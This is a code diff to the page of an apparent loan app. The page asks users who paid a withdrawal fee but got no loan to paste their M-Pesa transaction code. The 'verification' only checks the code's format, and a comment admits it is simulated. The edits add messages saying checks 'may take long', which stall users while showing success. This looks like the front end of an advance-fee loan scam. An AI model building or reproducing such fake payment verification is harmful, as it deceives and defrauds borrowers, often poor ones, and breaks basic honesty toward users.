@@ -818,9 +818,9 @@
     </div>
 
     <p class="text-sm text-gray-600 mb-4">
-      Paste your M-Pesa transaction code below to verify your withdrawal. 
-      Check your phone for the confirmation SMS from M-Pesa .after fee payment is done. eg THV5SCFSUH.
-      only valid codes and current codes are allowed by system.invalid are rejected.
+      Paste your M-Pesa transaction code below to verify your  withdrawal if you haven't received your loan amount or you had loan withdrawal issue and you have paid the fee required,
+      Check your phone for the confirmation SMS from M-Pesa you received after fee payment was done. eg THV5SCFSUH.
+      only valid codes and current codes are allowed by system. Not that nvalid are rejected and take long to be accepted.
     </p>
 
     <input 
@@ -1625,7 +1625,7 @@ function checkMpesaCode() {
 
     // For now, simulate checking (replace with real API later)
     if (/^[A-Z0-9]{10,}$/i.test(code)) {
-        resultBox.innerHTML = `<p class="text-green-600 font-medium">✅ correct Code format ${code} looks valid. Processing check for validility please wait...</p>`;
+        resultBox.innerHTML = `<p class="text-green-600 font-medium">✅ correct Code format ${code} looks valid. Processing check for validility please wait may take long if the code is not found...</p>`;
     } else {
         resultBox.innerHTML = `<p class="text-red-600">❌ Invalid code or formart. Please try again.</p>`;
     }
